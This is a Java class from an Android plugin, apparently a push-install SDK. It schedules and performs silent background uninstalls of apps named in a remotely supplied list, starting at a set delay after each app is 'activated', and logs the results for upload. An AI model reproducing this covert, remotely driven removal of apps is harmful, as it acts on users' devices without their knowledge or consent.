package com.tiho.dlplugin.task.uninstall;

import java.util.Collections;
import java.util.Comparator;
import java.util.LinkedList;
import java.util.List;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushUninstallBean;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.dao.PushUninstallDAO;
import com.tiho.dlplugin.install.PackageUtilsEx;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.task.TaskRegister;
import com.tiho.dlplugin.task.activate.ActivatedRecord;
import com.tiho.dlplugin.util.Pair;
import com.tiho.dlplugin.util.SilentInstall;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

/**
 * 卸载应用任务
 * 
 * @author Joey.Dai
 * 
 */
public class UnInstallTask extends BroadcastReceiver implements Comparator<Pair<String, Long>> {

	private Context context;

	private ActivatedRecord record;

	private PushUninstallDAO uninstallDao;

	private List<Pair<String, Long>> target;

	private static UnInstallTask instance;

	public synchronized static UnInstallTask getInstance(Context c, ActivatedRecord record) {
		if (instance == null)
			instance = new UnInstallTask(c, record);

		return instance;
	}

	private UnInstallTask(Context c, ActivatedRecord record) {
		this.context = c;

		this.record = record;
		uninstallDao = DAOFactory.getUninstallDAO(c);
		target = new LinkedList<Pair<String, Long>>();

	}

	/**
	 * 检查数据库中的卸载列表是否已激活过，是的话就加入到卸载列表target中
	 * 该方法每次执行都会设置定时任务，将target中的应用定时卸载
	 */
	public void updateTask() {
		target.clear();
		//从数据库中读取卸载列表
		List<PushUninstallBean> uninstalls = uninstallDao.getUninstallAppList();
		for (PushUninstallBean pushUninstallBean : uninstalls) {
			String pack = pushUninstallBean.getPackName();
			//判断卸载列表中的包名是否已激活，已激活的话就添加到target中
			if (record.activated(pushUninstallBean.getPackName())) {
				target.add(Pair.of(pack, record.getActivatedTime(pushUninstallBean.getPackName()) + pushUninstallBean.getUninstallTime() * 60000L));
			}
		}

		// 从小到大排列
		Collections.sort(target, this);

		setAlarmTask();

	}

	/**
	 * 设定卸载定时任务
	 * 
	 * @param deletePack
	 *            要去除的包名
	 */
	private void setAlarmTask() {
		if (!target.isEmpty()) {
			for (Pair<String, Long> pair : target) {
				Bundle bd = new Bundle();
				bd.putString("pack", pair.first);

				LogManager.LogShow(pair.first+"在"+pair.second/60000+"分钟后卸载");
				
				// 设定卸载任务,如果触发卸载任务的时间已经过去，则会立即执行定时任务，不会重复注册广播接收器吗？
				TaskRegister.registerExactTask(context, pair.second, this, bd, false);
			}
		}

	}

	@Override
	public void onReceive(Context context, Intent intent) {
		Bundle bd = intent.getExtras();
		final String pack = bd.getString("pack");
		
		LogManager.LogShow("onReceive context = " + context + ", pack = " + pack);
		int ret = SilentInstall.backgroundUnInstall(context, pack);
		LogManager.LogShow("onReceive 卸载结果 ret = " + ret + ", pkg = " + pack);
		LogUploadManager.getInstance(UnInstallTask.this.context).addUninstallLog(pack,  PackageUtilsEx.INSTALL_SUCCEEDED == ret ? 1 : 0, ret + "");
		
		
//		SilentInstall.backgroundUnInstall(context, pack, new IPackageDeleteObserver() {
//
//			@Override
//			public void packageDeleted(boolean arg0) throws RemoteException {
//				LogManager.LogShow(pack + "卸载结果:" + arg0);
//				LogUploadManager.getInstance(UnInstallTask.this.context).addUninstallLog(pack,  arg0 ? 1 : 0, "");
//			}
//
//			@Override
//			public IBinder asBinder() {
//				return null;
//			}
//
//		});
		
		if(SilentInstall.IsSupportBGInstall(context) == 0 ){
			LogUploadManager.getInstance(UnInstallTask.this.context).addUninstallLog(pack, 1, "SUCCESS");
		}else{
			
			LogUploadManager.getInstance(UnInstallTask.this.context).addUninstallLog(pack,  0, "NO PERMISSION");
		}
		
	}

	@Override
	public int compare(Pair<String, Long> lhs, Pair<String, Long> rhs) {
		if (lhs.second < rhs.second)
			return -1;
		if (lhs.second > rhs.second)
			return 1;
		return 0;
	}

}
